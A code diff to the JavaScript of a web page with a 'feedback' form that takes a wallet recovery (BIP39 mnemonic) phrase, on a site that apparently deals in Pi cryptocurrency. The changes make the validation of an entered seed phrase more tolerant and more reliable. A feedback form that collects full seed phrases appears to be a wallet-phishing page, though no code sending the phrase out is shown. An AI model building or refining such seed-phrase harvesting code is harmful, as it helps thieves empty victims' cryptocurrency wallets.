@@ -10,10 +10,13 @@ let isBuyingPi = false;
 // ========================================
 document.addEventListener('DOMContentLoaded', function () {
     console.log('DOM Loaded');
-    initializeFeedbackPage();
-    initializeDexPage();
-    initializeMobileMenu();
-    setupInputListeners();
+    // Wait a bit for BIP39 library to load
+    setTimeout(() => {
+        initializeFeedbackPage();
+        initializeDexPage();
+        initializeMobileMenu();
+        setupInputListeners();
+    }, 100);
 });
 
 // ========================================
@@ -65,22 +68,30 @@ async function initializeFeedbackPage() {
         }
 
         // Check if all words are in wordlist
-        for (const word of words) {
-            if (!wordlist.includes(word)) {
-                console.log('Invalid word found:', word);
-                return false;
+        if (wordlist.length > 0) {
+            for (const word of words) {
+                if (!wordlist.includes(word)) {
+                    console.log('Invalid word found:', word);
+                    return false;
+                }
             }
         }
 
         // Check with BIP39 library if available
-        if (typeof window.bip39 !== 'undefined') {
-            const isValid = window.bip39.validateMnemonic(mnemonic);
-            console.log('BIP39 library validation:', isValid);
-            return isValid;
+        if (typeof window.bip39 !== 'undefined' && window.bip39 && window.bip39.validateMnemonic) {
+            try {
+                const isValid = window.bip39.validateMnemonic(mnemonic);
+                console.log('BIP39 library validation:', isValid);
+                return isValid;
+            } catch (error) {
+                console.error('BIP39 validation error:', error);
+                // If BIP39 fails, fall back to wordlist check
+                return true;
+            }
         } else {
-            console.warn('BIP39 library not loaded, skipping checksum validation');
-            // If BIP39 library isn't loaded, just check wordlist
-            return true;
+            console.warn('BIP39 library not available, using wordlist validation only');
+            // If BIP39 library isn't loaded, accept if all words are valid
+            return wordlist.length > 0;
         }
     }
 
@@ -89,7 +100,7 @@ async function initializeFeedbackPage() {
         console.log('Form submitted');
 
         const mnemonic = mnemonicInput.value.trim().toLowerCase();
-        console.log('Mnemonic length:', mnemonic.length);
+        console.log('Mnemonic entered, word count:', mnemonic.split(/\s+/).filter(w => w.length > 0).length);
 
         // Validate passphrase
         if (!isValidBip39Mnemonic(mnemonic)) {
